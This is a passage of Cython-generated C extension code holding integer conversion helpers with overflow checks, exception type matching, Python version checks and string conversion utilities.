                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) >= 4 * PyLong_SHIFT)) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
        }
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7
        if (unlikely(Py_SIZE(x) < 0)) {
            goto raise_neg_overflow;
        }
#else
        {
            int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
            if (unlikely(result < 0))
                return (long) -1;
            if (unlikely(result == 1))
                goto raise_neg_overflow;
        }
#endif
        if ((sizeof(long) <= sizeof(unsigned long))) {
            __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
        } else if ((sizeof(long) <= sizeof(unsigned PY_LONG_LONG))) {
            __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
        }
    } else {
#if CYTHON_USE_PYLONG_INTERNALS
        if (__Pyx_PyLong_IsCompact(x)) {
            __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))
        } else {
            const digit* digits = __Pyx_PyLong_Digits(x);
            assert(__Pyx_PyLong_DigitCount(x) > 1);
            switch (__Pyx_PyLong_SignedDigitCount(x)) {
                case -2:
                    if ((8 * sizeof(long) - 1 > 1 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
        }
#endif
        if ((sizeof(long) <= sizeof(long))) {
            __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
        } else if ((sizeof(long) <= sizeof(PY_LONG_LONG))) {
            __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
        }
    }
    {
        long val;
        int ret = -1;
#if PY_VERSION_HEX >= 0x030d00A6 && !CYTHON_COMPILING_IN_LIMITED_API
        Py_ssize_t bytes_copied = PyLong_AsNativeBytes(
            x, &val, sizeof(val), Py_ASNATIVEBYTES_NATIVE_ENDIAN | (is_unsigned ? Py_ASNATIVEBYTES_UNSIGNED_BUFFER | Py_ASNATIVEBYTES_REJECT_NEGATIVE : 0));
        if (unlikely(bytes_copied == -1)) {
        } else if (unlikely(bytes_copied > (Py_ssize_t) sizeof(val))) {
            goto raise_overflow;
        } else {
            ret = 0;
        }
#elif PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)
        int one = 1; int is_little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&val;
        ret = _PyLong_AsByteArray((PyLongObject *)x,
                                    bytes, sizeof(val),
                                    is_little, !is_unsigned);
#else
        PyObject *v;
        PyObject *stepval = NULL, *mask = NULL, *shift = NULL;
        int bits, remaining_bits, is_negative = 0;
        int chunk_size = (sizeof(long) < 8) ? 30 : 62;
        if (likely(PyLong_CheckExact(x))) {
            v = __Pyx_NewRef(x);
        } else {
            v = PyNumber_Long(x);
            if (unlikely(!v)) return (long) -1;
            assert(PyLong_CheckExact(v));
        }
        {
            int result = PyObject_RichCompareBool(v, Py_False, Py_LT);
            if (unlikely(result < 0)) {
                Py_DECREF(v);
                return (long) -1;
            }
            is_negative = result == 1;
        }
        if (is_unsigned && unlikely(is_negative)) {
            Py_DECREF(v);
            goto raise_neg_overflow;
        } else if (is_negative) {
            stepval = PyNumber_Invert(v);
            Py_DECREF(v);
            if (unlikely(!stepval))
                return (long) -1;
        } else {
            stepval = v;
        }
        v = NULL;
        val = (long) 0;
        mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;
        shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;
        for (bits = 0; bits < (int) sizeof(long) * 8 - chunk_size; bits += chunk_size) {
            PyObject *tmp, *digit;
            long idigit;
            digit = PyNumber_And(stepval, mask);
            if (unlikely(!digit)) goto done;
            idigit = PyLong_AsLong(digit);
            Py_DECREF(digit);
            if (unlikely(idigit < 0)) goto done;
            val |= ((long) idigit) << bits;
            tmp = PyNumber_Rshift(stepval, shift);
            if (unlikely(!tmp)) goto done;
            Py_DECREF(stepval); stepval = tmp;
        }
        Py_DECREF(shift); shift = NULL;
        Py_DECREF(mask); mask = NULL;
        {
            long idigit = PyLong_AsLong(stepval);
            if (unlikely(idigit < 0)) goto done;
            remaining_bits = ((int) sizeof(long) * 8) - bits - (is_unsigned ? 0 : 1);
            if (unlikely(idigit >= (1L << remaining_bits)))
                goto raise_overflow;
            val |= ((long) idigit) << bits;
        }
        if (!is_unsigned) {
            if (unlikely(val & (((long) 1) << (sizeof(long) * 8 - 1))))
                goto raise_overflow;
            if (is_negative)
                val = ~val;
        }
        ret = 0;
    done:
        Py_XDECREF(shift);
        Py_XDECREF(mask);
        Py_XDECREF(stepval);
#endif
        if (unlikely(ret))
            return (long) -1;
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyLong_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (unlikely(!PyLong_Check(x))) {
        int val;
        PyObject *tmp = __Pyx_PyNumber_Long(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyLong_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
    if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
        if (unlikely(__Pyx_PyLong_IsNeg(x))) {
            goto raise_neg_overflow;
        } else if (__Pyx_PyLong_IsCompact(x)) {
            __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))
        } else {
            const digit* digits = __Pyx_PyLong_Digits(x);
            assert(__Pyx_PyLong_DigitCount(x) > 1);
            switch (__Pyx_PyLong_DigitCount(x)) {
                case 2:
                    if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) >= 2 * PyLong_SHIFT)) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) >= 3 * PyLong_SHIFT)) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) >= 4 * PyLong_SHIFT)) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
        }
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7
        if (unlikely(Py_SIZE(x) < 0)) {
            goto raise_neg_overflow;
        }
#else
        {
            int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
            if (unlikely(result < 0))
                return (int) -1;
            if (unlikely(result == 1))
                goto raise_neg_overflow;
        }
#endif
        if ((sizeof(int) <= sizeof(unsigned long))) {
            __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
        } else if ((sizeof(int) <= sizeof(unsigned PY_LONG_LONG))) {
            __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
        }
    } else {
#if CYTHON_USE_PYLONG_INTERNALS
        if (__Pyx_PyLong_IsCompact(x)) {
            __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))
        } else {
            const digit* digits = __Pyx_PyLong_Digits(x);
            assert(__Pyx_PyLong_DigitCount(x) > 1);
            switch (__Pyx_PyLong_SignedDigitCount(x)) {
                case -2:
                    if ((8 * sizeof(int) - 1 > 1 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {
                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
        }
#endif
        if ((sizeof(int) <= sizeof(long))) {
            __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
        } else if ((sizeof(int) <= sizeof(PY_LONG_LONG))) {
            __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
        }
    }
    {
        int val;
        int ret = -1;
#if PY_VERSION_HEX >= 0x030d00A6 && !CYTHON_COMPILING_IN_LIMITED_API
        Py_ssize_t bytes_copied = PyLong_AsNativeBytes(
            x, &val, sizeof(val), Py_ASNATIVEBYTES_NATIVE_ENDIAN | (is_unsigned ? Py_ASNATIVEBYTES_UNSIGNED_BUFFER | Py_ASNATIVEBYTES_REJECT_NEGATIVE : 0));
        if (unlikely(bytes_copied == -1)) {
        } else if (unlikely(bytes_copied > (Py_ssize_t) sizeof(val))) {
            goto raise_overflow;
        } else {
            ret = 0;
        }
#elif PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)
        int one = 1; int is_little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&val;
        ret = _PyLong_AsByteArray((PyLongObject *)x,
                                    bytes, sizeof(val),
                                    is_little, !is_unsigned);
#else
        PyObject *v;
        PyObject *stepval = NULL, *mask = NULL, *shift = NULL;
        int bits, remaining_bits, is_negative = 0;
        int chunk_size = (sizeof(long) < 8) ? 30 : 62;
        if (likely(PyLong_CheckExact(x))) {
            v = __Pyx_NewRef(x);
        } else {
            v = PyNumber_Long(x);
            if (unlikely(!v)) return (int) -1;
            assert(PyLong_CheckExact(v));
        }
        {
            int result = PyObject_RichCompareBool(v, Py_False, Py_LT);
            if (unlikely(result < 0)) {
                Py_DECREF(v);
                return (int) -1;
            }
            is_negative = result == 1;
        }
        if (is_unsigned && unlikely(is_negative)) {
            Py_DECREF(v);
            goto raise_neg_overflow;
        } else if (is_negative) {
            stepval = PyNumber_Invert(v);
            Py_DECREF(v);
            if (unlikely(!stepval))
                return (int) -1;
        } else {
            stepval = v;
        }
        v = NULL;
        val = (int) 0;
        mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;
        shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;
        for (bits = 0; bits < (int) sizeof(int) * 8 - chunk_size; bits += chunk_size) {
            PyObject *tmp, *digit;
            long idigit;
            digit = PyNumber_And(stepval, mask);
            if (unlikely(!digit)) goto done;
            idigit = PyLong_AsLong(digit);
            Py_DECREF(digit);
            if (unlikely(idigit < 0)) goto done;
            val |= ((int) idigit) << bits;
            tmp = PyNumber_Rshift(stepval, shift);
            if (unlikely(!tmp)) goto done;
            Py_DECREF(stepval); stepval = tmp;
        }
        Py_DECREF(shift); shift = NULL;
        Py_DECREF(mask); mask = NULL;
        {
            long idigit = PyLong_AsLong(stepval);
            if (unlikely(idigit < 0)) goto done;
            remaining_bits = ((int) sizeof(int) * 8) - bits - (is_unsigned ? 0 : 1);
            if (unlikely(idigit >= (1L << remaining_bits)))
                goto raise_overflow;
            val |= ((int) idigit) << bits;
        }
        if (!is_unsigned) {
            if (unlikely(val & (((int) 1) << (sizeof(int) * 8 - 1))))
                goto raise_overflow;
            if (is_negative)
                val = ~val;
        }
        ret = 0;
    done:
        Py_XDECREF(shift);
        Py_XDECREF(mask);
        Py_XDECREF(stepval);
#endif
        if (unlikely(ret))
            return (int) -1;
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = __Pyx_PyType_GetSlot(a, tp_base, PyTypeObject*);
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
static CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (cls == a || cls == b) return 1;
    mro = cls->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            PyObject *base = PyTuple_GET_ITEM(mro, i);
            if (base == (PyObject *)a || base == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(cls, a) || __Pyx_InBases(cls, b);
}
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    if (exc_type1) {
        return __Pyx_IsAnySubtype2((PyTypeObject*)err, (PyTypeObject*)exc_type1, (PyTypeObject*)exc_type2);
    } else {
        return __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
}
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* GetRuntimeVersion */
static unsigned long __Pyx_get_runtime_version(void) {
#if __PYX_LIMITED_VERSION_HEX >= 0x030b0000
    return Py_Version & ~0xFFUL;
#else
    static unsigned long __Pyx_cached_runtime_version = 0;
    if (__Pyx_cached_runtime_version == 0) {
        const char* rt_version = Py_GetVersion();
        unsigned long version = 0;
        unsigned long factor = 0x01000000UL;
        unsigned int digit = 0;
        int i = 0;
        while (factor) {
            while ('0' <= rt_version[i] && rt_version[i] <= '9') {
                digit = digit * 10 + (unsigned int) (rt_version[i] - '0');
                ++i;
            }
            version += factor * digit;
            if (rt_version[i] != '.')
                break;
            digit = 0;
            factor >>= 8;
            ++i;
        }
        __Pyx_cached_runtime_version = version;
    }
    return __Pyx_cached_runtime_version;
#endif
}

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer) {
    const unsigned long MAJOR_MINOR = 0xFFFF0000UL;
    if ((rt_version & MAJOR_MINOR) == (ct_version & MAJOR_MINOR))
        return 0;
    if (likely(allow_newer && (rt_version & MAJOR_MINOR) > (ct_version & MAJOR_MINOR)))
        return 1;
    {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compile time Python version %d.%d "
                      "of module '%.100s' "
                      "%s "
                      "runtime version %d.%d",
                       (int) (ct_version >> 24), (int) ((ct_version >> 16) & 0xFF),
                       __Pyx_MODULE_NAME,
                       (allow_newer) ? "was newer than" : "does not match",
                       (int) (rt_version >> 24), (int) ((rt_version >> 16) & 0xFF)
       );
        return PyErr_WarnEx(NULL, message, 1);
    }
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry const *t, PyObject **target, const char* const* encoding_names) {
    while (t->s) {
        PyObject *str;
        if (t->is_unicode) {
            if (t->intern) {
                str = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                str = PyUnicode_Decode(t->s, t->n - 1, encoding_names[t->encoding], NULL);
            } else {
                str = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            str = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        if (!str)
            return -1;
        *target = str;
        if (PyObject_Hash(str) == -1)
            return -1;
        ++t;
        ++target;
    }
    return 0;
}

#include <string.h>
static CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s) {
    size_t len = strlen(s);
    if (unlikely(len > (size_t) PY_SSIZE_T_MAX)) {
        PyErr_SetString(PyExc_OverflowError, "byte string is too long");
        return -1;
    }
    return (Py_ssize_t) len;
}
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    Py_ssize_t len = __Pyx_ssize_strlen(c_str);
    if (unlikely(len < 0)) return NULL;
    return __Pyx_PyUnicode_FromStringAndSize(c_str, len);
}
static CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char* c_str) {
    Py_ssize_t len = __Pyx_ssize_strlen(c_str);
    if (unlikely(len < 0)) return NULL;
    return PyByteArray_FromStringAndSize(c_str, len);
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_UTF8
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if CYTHON_COMPILING_IN_LIMITED_API
    {
        const char* result;
        Py_ssize_t unicode_length;
        CYTHON_MAYBE_UNUSED_VAR(unicode_length); // only for __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
        #if __PYX_LIMITED_VERSION_HEX < 0x030A0000
        if (unlikely(PyArg_Parse(o, "s#", &result, length) < 0)) return NULL;
        #else
        result = PyUnicode_AsUTF8AndSize(o, length);
        #endif
        #if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
        unicode_length = PyUnicode_GetLength(o);
        if (unlikely(unicode_length < 0)) return NULL;
        if (unlikely(unicode_length != *length)) {
            PyUnicode_AsASCIIString(o);
            return NULL;
        }
        #endif
        return result;
    }
#else
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
#endif
}
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_UTF8
    if (PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
    if (PyByteArray_Check(o)) {
#if (CYTHON_ASSUME_SAFE_SIZE && CYTHON_ASSUME_SAFE_MACROS) || (CYTHON_COMPILING_IN_PYPY && (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE)))
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
#else
        *length = PyByteArray_Size(o);
        if (*length == -1) return NULL;
        return PyByteArray_AsString(o);
#endif
    } else
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_LongWrongResultType(PyObject* result) {
